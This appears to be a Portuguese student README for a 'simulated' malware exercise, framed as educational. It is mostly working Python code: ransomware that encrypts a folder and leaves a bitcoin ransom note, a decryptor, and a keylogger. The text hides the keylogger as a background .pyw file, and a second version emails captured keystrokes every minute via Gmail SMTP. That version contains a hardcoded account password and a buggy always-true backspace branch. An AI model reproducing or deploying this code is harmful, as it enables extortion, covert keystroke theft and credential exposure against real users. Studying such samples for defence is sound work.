Nesse Simulado, vou criar 2 itens que serão apresentadoa nesse redme. Lembrando que o conteudo desse documento é apenas educativo e executado em ambiente 100% seguro.

Vou começar pela construção de um Ransomware Simulado.
Estou utilizando o VS Code para criar os codigos em python e para isso criei a pasta local e as subpastas que vao receber os codigos.
Pasta Criada: Malware/test_files
Dentro de text_files criei mais 2 arquivo, um de senhas. txt e um de arquivo confidenciais
Dentro da Pasta raiz (Malware) criei o nosso arquivo .py que será o arquivo que vai invadir, capturar e criptografar os arquivos.


Criando o arquivo ransoware.py
from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar 
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Caso queira seus arquivos de volta, voce devera enviar 10 bitcoins para o endereço X e nos enviar o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

#6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografos!")

if __name__=="__main__":
    main()


Executando esse Script em ambiente teste, consegui criptografar 2 arquivos de texte.

Agora, vou criar o arquivo para descriptografar os arquivos.

Decript.py
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()


--------------------- KEYLOGGER ------------------------

Criei uma nova pasta com o nome Keylogger no VS Code
Para implementar os codigosm foi necessario instalar a biblioteca pynput do python.

Criar o arquivo keylogger.py
from pynput import keyboard 

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try: 
        # se for uma tecla "normal" (letra, número, símboolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass 
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

Rodando o arquivo em ambiebnte teste, pude ver o keylogger na pratica, gravando tudo que testei em um arquivo .txt

Agora para esconder o keylogger, mudamos o nome do nosso arquivo keylogger.py para keylogger.pyw, dessa foram o windows executa em segundo plano.

Criei tbm um ambiente mais real, que é enviar os dados para um email teste (o email e senha gerado nesse exemplo, vao ser deletados apos a conclusao desse documento.

from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

#CONFIGURAÇÕES DE E-MAIL 
EMAIL_ORIGEM = "demokeytxt001@gmail.com"
EMAIL_DESTINO= "demokeytxt001@gmail.com"
SENHA_EMAIL = "vsfi xyzz lbyk afsn"

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char 
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # Ignorar control, shift, etc...

# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

Nesse exemplo, estamos enviando os dados capturados para um email.

Chegamos ao fim do nosso exercicio.

                                                                            




